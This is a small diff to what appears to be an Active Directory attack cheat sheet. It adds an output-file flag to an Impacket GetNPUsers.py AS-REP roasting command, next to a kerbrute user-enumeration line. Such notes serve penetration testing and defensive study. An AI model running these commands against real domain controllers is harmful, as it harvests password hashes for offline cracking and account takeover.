@@ -73,7 +73,7 @@ kerbrute -users userlist.txt -dc-ip IP -domain domain.local
 ASREPRoasting
 
 ```
-GetNPUsers.py -dc-ip IP domain.local/user
+GetNPUsers.py -dc-ip IP domain.local/user -outputfile hashes.asreproast
 ```
 DRSUAPI
 
